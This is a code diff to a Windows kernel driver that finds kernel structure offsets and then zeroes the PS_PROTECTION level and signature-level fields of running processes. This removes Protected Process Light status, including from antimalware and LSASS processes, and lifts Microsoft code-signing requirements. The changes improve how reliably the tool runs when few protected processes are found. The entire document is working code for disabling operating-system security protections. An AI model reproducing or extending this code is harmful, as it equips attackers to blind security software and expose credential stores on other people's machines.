@@ -42,9 +42,9 @@ extern "C"
 
 	NTSTATUS
 	UnprotectProcesses(
-		_In_ ULONG PsProtectionOffset,
-		_In_ ULONG SignatureLevelOffset,
-		_In_ ULONG SectionSignatureLevelOffset,
+		_In_opt_ ULONG PsProtectionOffset,
+		_In_opt_ ULONG SignatureLevelOffset,
+		_In_opt_ ULONG SectionSignatureLevelOffset,
 		_Out_ PULONG NumProcessesUnprotected,
 		_Out_ PULONG NumSignatureRequirementsRemoved
 		);
@@ -247,10 +247,17 @@ FindPsProtectionOffset(
 		goto finished;
 	}
 
-	if (NumProtectedProcesses > 0)
+	if (NumProtectedProcesses > 1) // Require at least System + 1 PPL to give a reliable result
 		Log("Found PS_PROTECTION offset +0x%02X.\n", Offset);
 	else
-		Log("Did not find any protected processes.\n");
+	{
+		// This is not an error condition; it just means there are no processes to unprotect.
+		// There may still be processes with signature requirements to remove. Set a non-error status to indicate this.
+		Log("Did not find any non-system protected processes.\n");
+		Status = STATUS_NO_MORE_ENTRIES;
+		Offset = 0;
+	}
+		
 	*PsProtectionOffset = Offset;
 
 finished:
@@ -424,11 +431,18 @@ FindSignatureLevelOffsets(
 		goto finished;
 	}
 
-	if (NumSignatureRequiredProcesses > 0)
+	if (NumSignatureRequiredProcesses > 1) // Require at least System + 1 other MS signing policy process to give a reliable result
 		Log("Found SignatureLevel offset +0x%02X and SectionSignatureLevel offset +0x%02X.\n\n",
 			SignatureOffset, SectionSignatureOffset);
 	else
-		Log("Did not find any non-system processes with signature requirements.\n\n");
+	{
+		// This is not an error condition; it just means there are no processes with MS code signing requirements.
+		// There may still be PPLs to kill. Set a non-error status to indicate this.
+		Log("Did not find any non-system processes with signature requirements.\n");
+		Status = STATUS_NO_MORE_ENTRIES;
+		SignatureOffset = 0;
+		SectionSignatureOffset = 0;
+	}
 	*SignatureLevelOffset = SignatureOffset;
 	*SectionSignatureLevelOffset = SectionSignatureOffset;
 
@@ -442,9 +456,9 @@ finished:
 
 NTSTATUS
 UnprotectProcesses(
-	_In_ ULONG PsProtectionOffset,
-	_In_ ULONG SignatureLevelOffset,
-	_In_ ULONG SectionSignatureLevelOffset,
+	_In_opt_ ULONG PsProtectionOffset,
+	_In_opt_ ULONG SignatureLevelOffset,
+	_In_opt_ ULONG SectionSignatureLevelOffset,
 	_Out_ PULONG NumProcessesUnprotected,
 	_Out_ PULONG NumSignatureRequirementsRemoved
 	)
@@ -489,21 +503,25 @@ UnprotectProcesses(
 		if (NT_SUCCESS(Status))
 		{
 			const ULONG Pid = HandleToULong(Entry->UniqueProcessId);
-			const PPS_PROTECTION PsProtection = reinterpret_cast<PPS_PROTECTION>(
+
+			if (PsProtectionOffset != 0) // Do we have any PPLs to unprotect?
+			{
+				const PPS_PROTECTION PsProtection = reinterpret_cast<PPS_PROTECTION>(
 				reinterpret_cast<PUCHAR>(Process) + PsProtectionOffset);
 
-			// Skip non-light protected processes (i.e. System).
-			// You could also discriminate by signer, e.g. to leave LSASS or antimalware protection enabled
-			if (PsProtection->Level != 0 &&
-				PsProtection->s.Type == PsProtectedTypeProtectedLight)
-			{
-				Log("PID %u (%wZ) at 0x%p is a PPL: { type: %u, audit: %u, signer: %u }.\n", Pid, &Entry->ImageName,
-					Process, PsProtection->s.Type, PsProtection->s.Audit, PsProtection->s.Signer);
+				// Skip non-light protected processes (i.e. System).
+				// You could also discriminate by signer, e.g. to leave LSASS or antimalware protection enabled
+				if (PsProtection->Level != 0 &&
+					PsProtection->s.Type == PsProtectedTypeProtectedLight)
+				{
+					Log("PID %u (%wZ) at 0x%p is a PPL: { type: %u, audit: %u, signer: %u }.\n", Pid, &Entry->ImageName,
+						Process, PsProtection->s.Type, PsProtection->s.Audit, PsProtection->s.Signer);
 				
-				// Goodnight sweet prince
-				PsProtection->Level = 0;
-				(*NumProcessesUnprotected)++;
-				Log("Protection removed.\n\n");
+					// Goodnight sweet prince
+					PsProtection->Level = 0;
+					(*NumProcessesUnprotected)++;
+					Log("Protection removed.\n\n");
+				}
 			}
 
 			if (Pid != 0 && Pid != 4 &&											// Not a system process?
@@ -582,7 +600,7 @@ DriverEntry(
 	// Find the offset of the PS_PROTECTION field for the running kernel
 	ULONG PsProtectionOffset;
 	Status = FindPsProtectionOffset(&PsProtectionOffset);
-	if (!NT_SUCCESS(Status))
+	if (!NT_SUCCESS(Status) && Status != STATUS_NO_MORE_ENTRIES)
 	{
 		Log("Failed to find the PS_PROTECTION offset for Windows %u.%u.%u.\n",
 			VersionInfo.dwMajorVersion, VersionInfo.dwMinorVersion, VersionInfo.dwBuildNumber);
@@ -595,7 +613,7 @@ DriverEntry(
 	{
 		// Find the offsets of the [Section]SignatureLevel fields
 		Status = FindSignatureLevelOffsets(&SignatureLevelOffset, &SectionSignatureLevelOffset);
-		if (!NT_SUCCESS(Status))
+		if (!NT_SUCCESS(Status) && Status != STATUS_NO_MORE_ENTRIES)
 		{
 			Log("Failed to find the SignatureLevel and SectionSignatureLevel offsets for Windows %u.%u.%u.\n",
 				VersionInfo.dwMajorVersion, VersionInfo.dwMinorVersion, VersionInfo.dwBuildNumber);
